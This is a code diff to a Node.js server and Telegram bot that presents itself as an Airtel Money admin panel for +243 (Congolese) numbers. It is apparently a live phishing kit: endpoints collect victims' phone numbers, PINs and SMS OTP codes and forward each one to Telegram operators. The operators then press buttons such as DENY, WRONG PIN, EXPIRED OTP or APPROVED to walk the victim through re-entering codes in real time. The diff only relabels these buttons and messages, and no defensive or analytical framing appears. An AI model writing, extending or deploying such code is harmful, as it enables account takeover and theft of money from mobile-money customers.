@@ -1,5 +1,5 @@
 /**
- * AIRTEL - MULTI-ADMIN SERVER (+243 CODE)
+ * AIRTEL MONEY - MULTI-ADMIN SERVER (+243 LOCALIZATION)
  * Main Admin Chat ID: 8591555400
  */
 
@@ -107,18 +107,14 @@ async function initBot() {
 
       switch (actionType) {
         case 'DENY_CREDS':
+        case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Connexion refusée (DENY). Le client est invité à ressaisir son Code PIN dans des cases vides.`);
+          await bot.sendMessage(chatTarget, `❌ Code PIN rejeté. Le client est redirigé pour recharger son PIN.`);
           break;
         case 'ALLOW_CREDS':
           session.status = 'PROCEED_OTP';
           await bot.sendMessage(chatTarget, `✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).`);
-          break;
-        case 'WRONG_OTP':
-          session.status = 'RETRY_OTP';
-          session.otp = '';
-          await bot.sendMessage(chatTarget, `❌ Code OTP incorrect. Le client est invité à ressaisir un nouveau code OTP.`);
           break;
         case 'EXPIRED_OTP':
           session.status = 'RETRY_OTP';
@@ -145,7 +141,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN (ALLOW & DENY Buttons)
+// Step 1: Submit Phone Number & PIN (DENY / ALLOW Buttons)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -195,7 +191,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP (3 Buttons)
+// Step 2: Submit 4-digit SMS OTP (WRONG PIN ❌, EXPIRED OTP, APPROVED)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -214,9 +210,9 @@ app.post('/api/submit-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '❌ WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
-            { text: '⚠️ EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
-            { text: '✅ APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
+            { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
+            { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
       }
